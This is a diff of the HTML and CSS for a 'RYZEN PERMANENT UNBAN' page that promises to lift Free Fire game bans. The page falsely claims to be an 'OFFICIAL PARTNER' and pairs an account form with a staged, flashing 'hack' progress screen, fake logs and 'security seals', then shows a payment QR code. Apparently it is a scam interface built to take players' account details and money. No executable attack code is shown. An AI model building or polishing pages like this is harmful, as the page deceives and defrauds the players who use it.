@@ -19,14 +19,35 @@
             display: flex;
             flex-direction: column;
             align-items: center;
-            padding: 1rem 0.8rem;
+            padding: 0.8rem;
             background-image: 
-                radial-gradient(ellipse at 20% 50%, rgba(255, 0, 0, 0.05) 0%, transparent 60%),
-                radial-gradient(ellipse at 80% 50%, rgba(123, 47, 252, 0.05) 0%, transparent 60%);
+                radial-gradient(ellipse at 20% 50%, rgba(255, 0, 0, 0.06) 0%, transparent 60%),
+                radial-gradient(ellipse at 80% 50%, rgba(123, 47, 252, 0.06) 0%, transparent 60%);
             position: relative;
             overflow-x: hidden;
         }
 
+        /* ===== RESPONSIVE BASE ===== */
+        html {
+            font-size: 16px;
+        }
+
+        @media (max-width: 480px) {
+            html {
+                font-size: 14px;
+            }
+            body {
+                padding: 0.5rem;
+            }
+        }
+
+        @media (max-width: 380px) {
+            html {
+                font-size: 12px;
+            }
+        }
+
+        /* ===== PARTICLES ===== */
         #particles {
             position: fixed;
             top: 0;
@@ -40,14 +61,12 @@
 
         .particle {
             position: absolute;
-            width: 4px;
-            height: 4px;
             border-radius: 50%;
             animation: floatParticle linear infinite;
         }
 
-        .particle:nth-child(odd) { background: rgba(255, 0, 0, 0.3); }
-        .particle:nth-child(even) { background: rgba(123, 47, 252, 0.3); }
+        .particle:nth-child(odd) { background: rgba(255, 0, 0, 0.35); }
+        .particle:nth-child(even) { background: rgba(123, 47, 252, 0.35); }
 
         @keyframes floatParticle {
             0% { transform: translateY(100vh) scale(0); opacity: 0; }
@@ -56,9 +75,17 @@
             100% { transform: translateY(-10vh) scale(1); opacity: 0; }
         }
 
+        /* ===== ANIMATIONS ===== */
         @keyframes pulse {
             0%, 100% { transform: scale(1); opacity: 1; }
-            50% { transform: scale(1.1); opacity: 0.6; }
+            50% { transform: scale(1.15); opacity: 0.5; }
+        }
+
+        @keyframes pulseFast {
+            0%, 100% { transform: scale(1); opacity: 1; }
+            25% { transform: scale(1.2); opacity: 0.4; }
+            50% { transform: scale(1); opacity: 1; }
+            75% { transform: scale(1.2); opacity: 0.4; }
         }
 
         @keyframes shimmer {
@@ -82,29 +109,40 @@
             100% { background-position: 0% 100%; }
         }
 
-        @keyframes shake {
-            0%, 100% { transform: translateX(0); }
-            10% { transform: translateX(-10px); }
-            20% { transform: translateX(10px); }
-            30% { transform: translateX(-10px); }
-            40% { transform: translateX(10px); }
-            50% { transform: translateX(-5px); }
-            60% { transform: translateX(5px); }
-            70% { transform: translateX(-5px); }
-            80% { transform: translateX(5px); }
-            90% { transform: translateX(-2px); }
+        @keyframes shakeIntense {
+            0%, 100% { transform: translateX(0) rotate(0deg); }
+            10% { transform: translateX(-15px) rotate(-2deg); }
+            20% { transform: translateX(15px) rotate(2deg); }
+            30% { transform: translateX(-12px) rotate(-1.5deg); }
+            40% { transform: translateX(12px) rotate(1.5deg); }
+            50% { transform: translateX(-8px) rotate(-1deg); }
+            60% { transform: translateX(8px) rotate(1deg); }
+            70% { transform: translateX(-5px) rotate(-0.5deg); }
+            80% { transform: translateX(5px) rotate(0.5deg); }
+            90% { transform: translateX(-2px) rotate(0deg); }
         }
 
         @keyframes glowPulse {
             0%, 100% { box-shadow: 0 0 20px rgba(255, 0, 0, 0.1); }
-            50% { box-shadow: 0 0 60px rgba(255, 0, 0, 0.3); }
+            50% { box-shadow: 0 0 80px rgba(255, 0, 0, 0.4); }
         }
 
         @keyframes aggressiveFlash {
             0%, 100% { opacity: 1; }
-            25% { opacity: 0.3; }
-            50% { opacity: 1; }
-            75% { opacity: 0.3; }
+            20% { opacity: 0.2; }
+            40% { opacity: 1; }
+            60% { opacity: 0.2; }
+            80% { opacity: 1; }
+        }
+
+        @keyframes redGlow {
+            0%, 100% { text-shadow: 0 0 20px rgba(255, 0, 0, 0.1); }
+            50% { text-shadow: 0 0 60px rgba(255, 0, 0, 0.5), 0 0 120px rgba(255, 0, 0, 0.2); }
+        }
+
+        @keyframes dotPulse {
+            0%, 80%, 100% { opacity: 0; }
+            40% { opacity: 1; }
         }
 
         .dot-loader {
@@ -113,15 +151,12 @@
         .dot-loader:nth-child(2) { animation-delay: 0.2s; }
         .dot-loader:nth-child(3) { animation-delay: 0.4s; }
 
-        @keyframes dotPulse {
-            0%, 80%, 100% { opacity: 0; }
-            40% { opacity: 1; }
-        }
-
+        /* ===== SCROLLBAR ===== */
         ::-webkit-scrollbar { width: 4px; }
         ::-webkit-scrollbar-track { background: #05080f; }
         ::-webkit-scrollbar-thumb { background: linear-gradient(180deg, #ff0000, #7b2ffc); border-radius: 10px; }
 
+        /* ===== CONTAINER ===== */
         .container {
             max-width: 750px;
             width: 100%;
@@ -129,6 +164,7 @@
             z-index: 1;
         }
 
+        /* ===== GLOW ORBS ===== */
         .glow-orb {
             position: fixed;
             border-radius: 50%;
@@ -142,7 +178,7 @@
             height: 350px;
             top: -100px;
             right: -100px;
-            background: rgba(255, 0, 0, 0.04);
+            background: rgba(255, 0, 0, 0.05);
             animation: orbFloat 20s ease-in-out infinite;
         }
 
@@ -151,10 +187,11 @@
             height: 300px;
             bottom: -80px;
             left: -80px;
-            background: rgba(123, 47, 252, 0.04);
+            background: rgba(123, 47, 252, 0.05);
             animation: orbFloat 25s ease-in-out infinite reverse;
         }
 
+        /* ===== LOADING SCREEN ===== */
         #loadingScreen {
             position: fixed;
             top: 0;
@@ -170,17 +207,72 @@
             transition: opacity 0.6s;
         }
 
+        #loadingScreen .load-icon {
+            font-size: clamp(2.5rem, 8vw, 3.5rem);
+            margin-bottom: 0.8rem;
+            animation: pulse 1s ease-in-out infinite;
+        }
+
+        #loadingScreen .load-title {
+            color: #ff4444;
+            font-weight: 700;
+            letter-spacing: 5px;
+            font-size: clamp(0.7rem, 2.5vw, 1rem);
+        }
+
+        #loadingScreen .load-bar-container {
+            width: min(250px, 70vw);
+            height: 4px;
+            background: #141a24;
+            border-radius: 10px;
+            margin-top: 1rem;
+            overflow: hidden;
+            box-shadow: 0 0 20px rgba(255, 0, 0, 0.05);
+        }
+
+        #loadingScreen .load-bar {
+            width: 0%;
+            height: 100%;
+            background: linear-gradient(90deg, #ff0000, #7b2ffc);
+            border-radius: 10px;
+            transition: width 0.2s ease;
+        }
+
+        #loadingScreen .load-text {
+            color: #4a5a6e;
+            font-size: clamp(0.55rem, 1.8vw, 0.7rem);
+            margin-top: 0.6rem;
+            letter-spacing: 2px;
+        }
+
+        #loadingScreen .network-dots {
+            display: flex;
+            gap: 4px;
+            margin-top: 0.8rem;
+        }
+
+        #loadingScreen .network-dots .dot {
+            width: clamp(5px, 1.5vw, 7px);
+            height: clamp(5px, 1.5vw, 7px);
+            border-radius: 50%;
+            background: #ff0000;
+            animation: pulse 0.5s ease-in-out infinite;
+        }
+
+        #loadingScreen .network-dots .dot:nth-child(2) { animation-delay: 0.2s; background: #ff4444; }
+        #loadingScreen .network-dots .dot:nth-child(3) { animation-delay: 0.4s; background: #ff8888; }
+
+        /* ===== HEADER ===== */
         .header {
             text-align: center;
-            padding: 1.5rem 0 1rem 0;
+            padding: clamp(0.8rem, 3vw, 1.5rem) clamp(0.8rem, 3vw, 1.5rem);
             border-bottom: 1px solid rgba(255, 0, 0, 0.06);
-            margin-bottom: 2rem;
+            margin-bottom: clamp(0.8rem, 2vw, 1.5rem);
             position: relative;
             background: rgba(5, 8, 15, 0.5);
             border-radius: 20px;
             backdrop-filter: blur(10px);
             border: 1px solid rgba(255, 0, 0, 0.02);
-            padding: 2rem 1.5rem;
         }
 
         .header::before {
@@ -195,7 +287,7 @@
         }
 
         .logo-main {
-            font-size: clamp(1.6rem, 5vw, 2.6rem);
+            font-size: clamp(1.3rem, 5vw, 2.4rem);
             font-weight: 900;
             letter-spacing: 3px;
             background: linear-gradient(135deg, #ff0000, #7b2ffc, #ff0000, #7b2ffc);
@@ -205,35 +297,35 @@
             background-clip: text;
             animation: shimmer 3s linear infinite;
             filter: drop-shadow(0 0 30px rgba(255, 0, 0, 0.05));
-            position: relative;
         }
 
         .logo-sub {
-            font-size: clamp(0.5rem, 1.5vw, 0.75rem);
+            font-size: clamp(0.45rem, 1.5vw, 0.7rem);
             color: #6a8a9e;
             letter-spacing: 6px;
             text-transform: uppercase;
-            margin-top: 4px;
+            margin-top: 2px;
             font-weight: 300;
         }
 
         .verify-badge {
             display: inline-block;
-            margin-top: 8px;
+            margin-top: 6px;
             background: rgba(255, 0, 0, 0.04);
             border: 1px solid rgba(255, 0, 0, 0.06);
-            padding: 4px 16px;
+            padding: 3px 14px;
             border-radius: 30px;
             animation: pulse 1.5s ease-in-out infinite;
         }
+
         .verify-badge span {
             color: #ff4444;
-            font-size: 0.6rem;
+            font-size: clamp(0.45rem, 1.2vw, 0.6rem);
             letter-spacing: 2px;
         }
 
         .badge-container {
-            margin-top: 10px;
+            margin-top: 8px;
             display: flex;
             justify-content: center;
             gap: 6px;
@@ -243,9 +335,9 @@
         .badge {
             background: rgba(255, 0, 0, 0.04);
             border: 1px solid rgba(255, 0, 0, 0.06);
-            padding: 3px 12px;
+            padding: 2px 10px;
             border-radius: 30px;
-            font-size: clamp(0.4rem, 1vw, 0.6rem);
+            font-size: clamp(0.35rem, 1vw, 0.55rem);
             color: #ff6a6a;
             letter-spacing: 1px;
             text-transform: uppercase;
@@ -264,111 +356,112 @@
             animation: pulse 1.5s ease-in-out infinite;
         }
 
-        /* ===== SUPPORT BADGE (Option 6) ===== */
+        /* ===== SUPPORT BADGE ===== */
         .support-badge-container {
             display: flex;
             justify-content: center;
-            gap: 10px;
-            margin-top: 8px;
+            gap: 8px;
+            margin-top: 6px;
             flex-wrap: wrap;
         }
+
         .support-badge {
             background: rgba(92, 219, 158, 0.03);
             border: 1px solid rgba(92, 219, 158, 0.04);
-            padding: 2px 12px;
+            padding: 2px 10px;
             border-radius: 30px;
             color: #5cdb9e;
-            font-size: 0.5rem;
+            font-size: clamp(0.35rem, 1vw, 0.5rem);
             letter-spacing: 1px;
         }
+
         .support-badge.yellow {
             background: rgba(241, 196, 15, 0.03);
             border-color: rgba(241, 196, 15, 0.04);
             color: #f1c40f;
         }
 
-        /* ===== SERVER STATUS (Option 1) ===== */
+        /* ===== SERVER STATUS ===== */
         .server-status {
             background: rgba(255, 255, 255, 0.01);
             border: 1px solid rgba(255, 0, 0, 0.03);
             border-radius: 12px;
-            padding: 0.6rem 1rem;
-            margin-bottom: 1.5rem;
+            padding: 0.5rem 0.8rem;
+            margin-bottom: 1rem;
             display: flex;
             align-items: center;
             justify-content: space-between;
             flex-wrap: wrap;
-            gap: 8px;
-        }
-        .server-status .label {
-            color: #6a7a8e;
-            font-size: 0.65rem;
-        }
-        .server-status .value {
-            font-size: 0.65rem;
-        }
-        .server-status .value.green { color: #5cdb9e; font-weight: 600; }
-        .server-status .value.yellow { color: #f1c40f; font-weight: 600; }
-        .server-status .value.blue { color: #8a9bb0; font-weight: 400; }
-        .server-status .sep {
-            color: #4a5a6e;
-            font-size: 0.65rem;
+            gap: 4px;
         }
 
+        .server-status .label {
+            color: #6a7a8e;
+            font-size: clamp(0.5rem, 1.4vw, 0.6rem);
+        }
+
+        .server-status .value {
+            font-size: clamp(0.5rem, 1.4vw, 0.6rem);
+        }
+
+        .server-status .value.green { color: #5cdb9e; font-weight: 600; }
+        .server-status .value.blue { color: #8a9bb0; font-weight: 400; }
+        .server-status .sep { color: #4a5a6e; font-size: 0.5rem; }
+
+        /* ===== FORM ===== */
         .form-section {
             background: rgba(255, 255, 255, 0.01);
-            border-radius: 20px;
-            padding: 1.8rem 1.5rem;
+            border-radius: 16px;
+            padding: clamp(0.8rem, 3vw, 1.5rem);
             border: 1px solid rgba(255, 0, 0, 0.02);
             backdrop-filter: blur(8px);
-            margin-bottom: 1.5rem;
+            margin-bottom: 1rem;
         }
 
         .form-section .title {
-            font-size: clamp(1rem, 2.5vw, 1.3rem);
+            font-size: clamp(0.9rem, 2.5vw, 1.2rem);
             font-weight: 700;
             color: #f0f4ff;
             text-align: center;
-            margin-bottom: 0.3rem;
+            margin-bottom: 0.2rem;
         }
 
         .form-section .sub {
             color: #6a7a8e;
-            font-size: clamp(0.65rem, 1.5vw, 0.8rem);
+            font-size: clamp(0.55rem, 1.5vw, 0.7rem);
             text-align: center;
-            margin-bottom: 1.5rem;
+            margin-bottom: 1rem;
         }
 
-        /* ===== REQUEST ID (Option 3) ===== */
         .request-id {
             text-align: center;
             color: #4a5a6e;
-            font-size: 0.6rem;
+            font-size: clamp(0.5rem, 1.2vw, 0.55rem);
             letter-spacing: 1px;
             margin-bottom: 0.8rem;
         }
 
         .input-group {
-            margin-bottom: 1rem;
+            margin-bottom: 0.7rem;
         }
 
         .input-group label {
             display: block;
             color: #8a9bb0;
-            font-size: 0.7rem;
+            font-size: clamp(0.55rem, 1.3vw, 0.65rem);
             font-weight: 600;
             letter-spacing: 1px;
-            margin-bottom: 4px;
+            margin-bottom: 3px;
         }
 
         .input-group input {
             width: 100%;
-            padding: 12px 16px;
+            padding: clamp(8px, 2vw, 12px) clamp(10px, 2.5vw, 14px);
             background: rgba(255, 255, 255, 0.02);
             border: 1px solid rgba(255, 255, 255, 0.04);
-            border-radius: 12px;
+            border-radius: 10px;
             color: #f0f4ff;
-            font-size: 1rem;
+            font-size: clamp(0.8rem, 2vw, 0.95rem);
             transition: all 0.3s ease;
             outline: none;
         }
@@ -381,38 +474,40 @@
 
         .input-group input::placeholder {
             color: #3a4a5e;
+            font-size: clamp(0.7rem, 1.8vw, 0.85rem);
         }
 
         .input-group .optional {
             color: #4a5a6e;
-            font-size: 0.6rem;
+            font-size: 0.5rem;
             font-weight: 400;
-            margin-left: 5px;
+            margin-left: 4px;
         }
 
+        /* ===== BUTTON ===== */
         .recover-btn {
             width: 100%;
-            padding: 16px;
+            padding: clamp(12px, 2.5vw, 16px);
             background: linear-gradient(135deg, #ff0000, #7b2ffc);
             border: none;
             color: #fff;
-            font-size: clamp(1rem, 2.5vw, 1.2rem);
+            font-size: clamp(0.85rem, 2.5vw, 1.1rem);
             font-weight: 700;
-            border-radius: 14px;
+            border-radius: 12px;
             cursor: pointer;
             transition: all 0.4s ease;
             letter-spacing: 2px;
             box-shadow: 0 0 40px rgba(255, 0, 0, 0.05);
-            margin-top: 0.5rem;
+            margin-top: 0.3rem;
             animation: glowPulse 2s infinite;
         }
 
-        .recover-btn:hover {
+        .recover-btn:hover:not(:disabled) {
             transform: scale(1.02);
             box-shadow: 0 0 60px rgba(255, 0, 0, 0.1);
         }
 
-        .recover-btn:active {
+        .recover-btn:active:not(:disabled) {
             transform: scale(0.97);
         }
 
@@ -423,22 +518,22 @@
             animation: none;
         }
 
+        /* ===== AGGRESSIVE CONTAINER ===== */
         .aggressive-container {
             display: none;
-            background: rgba(0, 0, 0, 0.7);
+            background: rgba(0, 0, 0, 0.8);
             border-radius: 16px;
-            padding: 1.5rem;
+            padding: clamp(0.8rem, 3vw, 1.5rem);
             margin: 1rem 0;
             border: 1px solid rgba(255, 0, 0, 0.05);
-            min-height: 200px;
+            min-height: 180px;
             position: relative;
             overflow: hidden;
-            animation: shake 0.5s ease-in-out 3, aggressiveFlash 0.3s ease-in-out 10;
         }
 
         .aggressive-container.active {
             display: block;
-            animation: fadeIn 0.5s ease, shake 0.5s ease-in-out 3, aggressiveFlash 0.3s ease-in-out 10;
+            animation: fadeIn 0.5s ease, shakeIntense 0.6s ease-in-out 3, aggressiveFlash 0.3s ease-in-out 8;
         }
 
         .aggressive-container .matrix-bg {
@@ -451,7 +546,7 @@
                 rgba(255, 0, 0, 0.02) 0px,
                 rgba(255, 0, 0, 0.03) 2px,
                 transparent 4px);
-            animation: matrixRain 5s linear infinite;
+            animation: matrixRain 4s linear infinite;
             pointer-events: none;
         }
 
@@ -462,72 +557,75 @@
         }
 
         .aggressive-container .hack-status .icon {
-            font-size: 3rem;
-            margin-bottom: 0.5rem;
-            animation: pulse 0.5s ease-in-out infinite;
+            font-size: clamp(2.5rem, 7vw, 3.5rem);
+            margin-bottom: 0.3rem;
+            animation: pulseFast 0.4s ease-in-out infinite;
         }
 
         .aggressive-container .hack-status .text {
             color: #ff4444;
-            font-size: 1rem;
+            font-size: clamp(0.75rem, 2.2vw, 1rem);
             font-weight: 700;
             letter-spacing: 2px;
-            animation: aggressiveFlash 0.5s ease-in-out infinite;
+            animation: aggressiveFlash 0.5s ease-in-out infinite, redGlow 1s ease-in-out infinite;
         }
 
         .aggressive-container .hack-status .sub-text {
             color: #8a6a6e;
-            font-size: 0.75rem;
-            margin-top: 4px;
+            font-size: clamp(0.6rem, 1.6vw, 0.75rem);
+            margin-top: 3px;
         }
 
         .aggressive-container .hack-status .progress-text {
             color: #ff6666;
-            font-size: 1.2rem;
+            font-size: clamp(1rem, 3vw, 1.3rem);
             font-weight: 700;
-            margin-top: 0.5rem;
+            margin-top: 0.4rem;
             animation: aggressiveFlash 0.3s ease-in-out infinite;
         }
 
-        /* ===== STEP COUNTER (Option 2) ===== */
         .step-counter {
             color: #4a5a6e;
-            font-size: 0.6rem;
-            margin-top: 0.8rem;
+            font-size: clamp(0.5rem, 1.2vw, 0.6rem);
+            margin-top: 0.6rem;
             letter-spacing: 2px;
         }
 
-        /* ===== LOG OUTPUT (Option 4) ===== */
         .log-output {
             position: relative;
             z-index: 1;
             margin-top: 0.5rem;
-            background: rgba(0, 0, 0, 0.4);
+            background: rgba(0, 0, 0, 0.5);
             border-radius: 8px;
-            padding: 0.5rem;
-            max-height: 80px;
+            padding: 0.4rem;
+            max-height: 70px;
             overflow: hidden;
             border: 1px solid rgba(255, 0, 0, 0.03);
         }
+
         .log-output .log-content {
-            font-family: 'Courier New';
-            font-size: 0.55rem;
+            font-family: 'Courier New', monospace;
+            font-size: clamp(0.45rem, 1.2vw, 0.55rem);
             color: #5cdb9e;
             line-height: 1.6;
             text-align: left;
             overflow-y: auto;
-            max-height: 70px;
+            max-height: 60px;
         }
+
         .log-output .log-content div {
             opacity: 0.9;
+            white-space: nowrap;
+            overflow: hidden;
+            text-overflow: ellipsis;
         }
 
         .hack-progress {
             width: 100%;
-            height: 6px;
+            height: clamp(4px, 1vw, 6px);
             background: #141a24;
             border-radius: 10px;
-            margin-top: 1rem;
+            margin-top: 0.8rem;
             overflow: hidden;
             position: relative;
             z-index: 1;
@@ -539,19 +637,20 @@
             background: linear-gradient(90deg, #ff0000, #ff4444, #7b2ffc);
             border-radius: 10px;
             transition: width 0.3s ease;
-            animation: glowPulse 1s infinite;
+            animation: glowPulse 0.8s infinite;
         }
 
         .hack-progress .bar.aggressive {
-            animation: glowPulse 0.5s infinite, aggressiveFlash 0.3s ease-in-out infinite;
+            animation: glowPulse 0.4s infinite, aggressiveFlash 0.3s ease-in-out infinite;
         }
 
+        /* ===== PAYMENT ===== */
         .payment-section {
             display: none;
             text-align: center;
-            padding: 1.5rem;
+            padding: clamp(1rem, 3vw, 1.5rem);
             background: rgba(255, 255, 255, 0.01);
-            border-radius: 20px;
+            border-radius: 16px;
             border: 1px solid rgba(255, 0, 0, 0.02);
             margin: 1rem 0;
             animation: fadeIn 0.5s ease;
@@ -562,10 +661,10 @@
         }
 
         .payment-section .amount {
-            font-size: 2.5rem;
+            font-size: clamp(2rem, 6vw, 2.5rem);
             font-weight: 800;
             color: #f0f4ff;
-            margin: 0.5rem 0;
+            margin: 0.3rem 0;
         }
 
         .payment-section .amount span {
@@ -574,23 +673,23 @@
 
         .payment-section .qr-container {
             background: #ffffff;
-            padding: 20px;
+            padding: clamp(12px, 3vw, 20px);
             border-radius: 16px;
             display: inline-block;
-            margin: 1rem 0;
+            margin: 0.8rem 0;
             box-shadow: 0 0 40px rgba(0, 0, 0, 0.3);
         }
 
         .payment-section .qr-container img {
-            width: clamp(180px, 50vw, 240px);
-            height: clamp(180px, 50vw, 240px);
+            width: clamp(140px, 45vw, 220px);
+            height: clamp(140px, 45vw, 220px);
             display: block;
             border-radius: 8px;
         }
 
         .payment-section .instruction {
             color: #8a9bb0;
-            font-size: 0.8rem;
+            font-size: clamp(0.6rem, 1.8vw, 0.75rem);
             line-height: 1.8;
         }
 
@@ -602,10 +701,10 @@
             background: rgba(255, 0, 0, 0.1);
             border: 1px solid rgba(255, 0, 0, 0.1);
             color: #ff4444;
-            padding: 12px 40px;
+            padding: clamp(8px, 2vw, 12px) clamp(25px, 6vw, 40px);
             border-radius: 40px;
             cursor: pointer;
-            font-size: 0.9rem;
+            font-size: clamp(0.7rem, 2vw, 0.85rem);
             font-weight: 600;
             transition: all 0.4s ease;
             margin-top: 0.5rem;
@@ -616,12 +715,13 @@
             transform: translateY(-2px);
         }
 
+        /* ===== PROCESSING ===== */
         .processing-section {
             display: none;
             text-align: center;
-            padding: 2rem 1.5rem;
+            padding: clamp(1.2rem, 3vw, 2rem) clamp(1rem, 3vw, 1.5rem);
             background: rgba(255, 255, 255, 0.01);
-            border-radius: 20px;
+            border-radius: 16px;
             border: 1px solid rgba(255, 0, 0, 0.02);
             margin: 1rem 0;
             animation: fadeIn 0.5s ease;
@@ -632,33 +732,34 @@
         }
 
         .processing-section .spinner {
-            font-size: 3rem;
-            animation: pulse 0.5s ease-in-out infinite;
+            font-size: clamp(2.5rem, 7vw, 3.5rem);
+            animation: pulseFast 0.5s ease-in-out infinite;
             display: inline-block;
         }
 
         .processing-section .text {
             color: #ff4444;
-            font-size: 1rem;
+            font-size: clamp(0.8rem, 2.2vw, 1rem);
             font-weight: 600;
-            margin-top: 0.5rem;
+            margin-top: 0.3rem;
             letter-spacing: 2px;
-            animation: aggressiveFlash 1s ease-in-out infinite;
+            animation: aggressiveFlash 0.8s ease-in-out infinite, redGlow 1.5s ease-in-out infinite;
         }
 
         .processing-section .sub-text {
             color: #6a7a8e;
-            font-size: 0.8rem;
-            margin-top: 0.3rem;
+            font-size: clamp(0.6rem, 1.6vw, 0.75rem);
+            margin-top: 0.2rem;
         }
 
+        /* ===== FINAL ===== */
         .final-message {
             display: none;
             text-align: center;
-            padding: 2rem 1.5rem;
+            padding: clamp(1.2rem, 3vw, 2rem) clamp(1rem, 3vw, 1.5rem);
             background: rgba(255, 0, 0, 0.02);
             border: 1px solid rgba(255, 0, 0, 0.06);
-            border-radius: 20px;
+            border-radius: 16px;
             margin: 1rem 0;
             animation: fadeIn 0.6s ease;
         }
@@ -668,21 +769,21 @@
         }
 
         .final-message .icon {
-            font-size: 4rem;
-            margin-bottom: 0.5rem;
+            font-size: clamp(3rem, 8vw, 4rem);
+            margin-bottom: 0.3rem;
             animation: pulse 1s ease-in-out infinite;
         }
 
         .final-message .title {
-            font-size: 1.4rem;
+            font-size: clamp(1rem, 3vw, 1.4rem);
             font-weight: 700;
             color: #5cdb9e;
         }
 
         .final-message .desc {
             color: #8a9bb0;
-            font-size: 0.9rem;
-            margin: 0.5rem 0 1rem 0;
+            font-size: clamp(0.7rem, 2vw, 0.85rem);
+            margin: 0.3rem 0 0.8rem 0;
             line-height: 1.8;
         }
 
@@ -693,43 +794,32 @@
 
         .final-message .case-id {
             color: #4a5a6e;
-            font-size: 0.7rem;
+            font-size: clamp(0.5rem, 1.2vw, 0.6rem);
             letter-spacing: 1px;
-            margin-top: 0.5rem;
+            margin-top: 0.3rem;
         }
 
-        .security-seals {
-            display: flex;
-            justify-content: center;
-            gap: 15px;
-            flex-wrap: wrap;
-            margin-top: 10px;
-        }
-        .security-seals span {
-            color: #4a5a6e;
-            font-size: 0.55rem;
-            letter-spacing: 1px;
-        }
-
+        /* ===== FOOTER ===== */
         .footer {
-            margin-top: 2rem;
-            padding-top: 1.5rem;
+            margin-top: 1.5rem;
+            padding-top: 1rem;
             border-top: 1px solid rgba(255, 255, 255, 0.02);
             text-align: center;
             color: #3a4a5e;
-            font-size: clamp(0.5rem, 1.2vw, 0.65rem);
+            font-size: clamp(0.4rem, 1.2vw, 0.55rem);
             letter-spacing: 1px;
         }
 
         .footer strong { color: #5a6a7e; }
+
         .footer .developer {
             display: inline-block;
-            margin-top: 6px;
-            padding: 4px 16px;
+            margin-top: 4px;
+            padding: 3px 14px;
             background: linear-gradient(135deg, rgba(255, 0, 0, 0.02), rgba(123, 47, 252, 0.02));
             border: 1px solid rgba(255, 255, 255, 0.02);
             border-radius: 30px;
-            font-size: clamp(0.45rem, 1vw, 0.6rem);
+            font-size: clamp(0.35rem, 1vw, 0.5rem);
             color: #6a8a9e;
             letter-spacing: 2px;
         }
@@ -739,68 +829,97 @@
             font-weight: 600;
         }
 
-        /* ===== SUPPORT POPUP (Option 8) ===== */
+        .security-seals {
+            display: flex;
+            justify-content: center;
+            gap: 10px;
+            flex-wrap: wrap;
+            margin-top: 6px;
+        }
+
+        .security-seals span {
+            color: #4a5a6e;
+            font-size: clamp(0.35rem, 1vw, 0.5rem);
+            letter-spacing: 1px;
+        }
+
+        /* ===== SUPPORT POPUP ===== */
         #supportPopup {
             position: fixed;
-            bottom: 80px;
-            right: 20px;
+            bottom: 70px;
+            right: clamp(10px, 3vw, 20px);
             z-index: 999;
             background: #101520;
             border: 1px solid rgba(255, 0, 0, 0.05);
-            border-radius: 16px;
-            padding: 1rem;
-            max-width: 280px;
+            border-radius: 14px;
+            padding: clamp(0.6rem, 2vw, 1rem);
+            max-width: min(260px, 80vw);
             display: none;
             animation: fadeIn 0.5s ease;
             box-shadow: 0 20px 60px rgba(0, 0, 0, 0.5);
         }
+
         #supportPopup .popup-header {
             display: flex;
             align-items: center;
-            gap: 10px;
+            gap: 8px;
         }
+
         #supportPopup .popup-header .icon {
-            font-size: 1.5rem;
+            font-size: clamp(1.2rem, 4vw, 1.5rem);
         }
+
         #supportPopup .popup-header .title {
             color: #5cdb9e;
-            font-size: 0.7rem;
+            font-size: clamp(0.55rem, 1.5vw, 0.65rem);
             font-weight: 600;
         }
+
         #supportPopup .popup-header .sub {
             color: #8a9bb0;
-            font-size: 0.65rem;
+            font-size: clamp(0.45rem, 1.2vw, 0.55rem);
         }
+
         #supportPopup .popup-actions {
             display: flex;
-            gap: 8px;
-            margin-top: 8px;
+            gap: 6px;
+            margin-top: 6px;
         }
+
         #supportPopup .popup-actions .close-btn {
             background: rgba(255, 255, 255, 0.03);
             border: 1px solid rgba(255, 255, 255, 0.03);
             color: #6a7a8e;
-            padding: 4px 16px;
+            padding: 3px 12px;
             border-radius: 20px;
-            font-size: 0.6rem;
+            font-size: clamp(0.45rem, 1.2vw, 0.55rem);
             cursor: pointer;
         }
+
         #supportPopup .popup-actions .chat-btn {
             background: linear-gradient(135deg, #ff0000, #7b2ffc);
             border: none;
             color: #fff;
-            padding: 4px 16px;
+            padding: 3px 12px;
             border-radius: 20px;
-            font-size: 0.6rem;
+            font-size: clamp(0.45rem, 1.2vw, 0.55rem);
             cursor: pointer;
         }
 
+        /* ===== RESPONSIVE FINE-TUNE ===== */
         @media (max-width: 480px) {
-            .form-section { padding: 1rem 0.8rem; }
-            .header { padding: 1.2rem 0.8rem; }
-            .payment-section .amount { font-size: 2rem; }
-            .server-status { font-size: 0.55rem; }
-            #supportPopup { max-width: 220px; right: 10px; bottom: 70px; }
+            .form-section { padding: 0.8rem; }
+            .header { padding: 0.8rem; }
+            .payment-section .amount { font-size: 1.8rem; }
+            .server-status { font-size: 0.5rem; padding: 0.4rem 0.6rem; }
+            .aggressive-container { padding: 0.8rem; min-height: 150px; }
+            #supportPopup { max-width: 200px; bottom: 60px; }
+        }
+
+        @media (max-width: 380px) {
+            .aggressive-container .hack-status .text { font-size: 0.65rem; }
+            .aggressive-container .hack-status .sub-text { font-size: 0.5rem; }
+            .log-output .log-content { font-size: 0.4rem; }
         }
     </style>
 </head>
@@ -808,17 +927,16 @@
 
 <!-- ===== LOADING SCREEN ===== -->
 <div id="loadingScreen">
-    <div style="font-size:3rem; margin-bottom:1rem; animation: pulse 1s ease-in-out infinite;">⚡</div>
-    <div style="color:#ff4444; font-weight:700; letter-spacing:5px; font-size:1rem;">LOADING PERMANENT UNBAN PORTAL</div>
-    <div style="width:250px; height:4px; background:#141a24; border-radius:10px; margin-top:1.2rem; overflow:hidden; box-shadow: 0 0 20px rgba(255, 0, 0, 0.05);">
-        <div id="loadBar" style="width:0%; height:100%; background:linear-gradient(90deg,#ff0000,#7b2ffc); border-radius:10px; transition:width 0.2s ease;"></div>
+    <div class="load-icon">⚡</div>
+    <div class="load-title">LOADING PERMANENT UNBAN PORTAL</div>
+    <div class="load-bar-container">
+        <div class="load-bar" id="loadBar"></div>
     </div>
-    <div style="color:#4a5a6e; font-size:0.7rem; margin-top:0.8rem; letter-spacing:2px;" id="loadText">Initializing...</div>
-    <!-- ===== NETWORK SCAN (Option 7) ===== -->
-    <div style="display:flex; gap:4px; margin-top:0.8rem;">
-        <div style="width:6px; height:6px; border-radius:50%; background:#ff0000; animation:pulse 0.5s ease-in-out infinite;"></div>
-        <div style="width:6px; height:6px; border-radius:50%; background:#ff4444; animation:pulse 0.5s ease-in-out infinite 0.2s;"></div>
-        <div style="width:6px; height:6px; border-radius:50%; background:#ff8888; animation:pulse 0.5s ease-in-out infinite 0.4s;"></div>
+    <div class="load-text" id="loadText">Initializing...</div>
+    <div class="network-dots">
+        <div class="dot"></div>
+        <div class="dot"></div>
+        <div class="dot"></div>
     </div>
 </div>
 
@@ -826,7 +944,7 @@
 <div class="glow-orb orb1"></div>
 <div class="glow-orb orb2"></div>
 
-<!-- ===== ANIMATED PARTICLES ===== -->
+<!-- ===== PARTICLES ===== -->
 <div id="particles"></div>
 
 <div class="container">
@@ -835,22 +953,19 @@
     <header class="header">
         <div class="logo-main">⚡ RYZEN PERMANENT UNBAN</div>
         <div class="logo-sub">Free Fire · Permanent Ban Solution</div>
-        <div class="verify-badge">
-            <span>✅ OFFICIAL PARTNER</span>
-        </div>
+        <div class="verify-badge"><span>✅ OFFICIAL PARTNER</span></div>
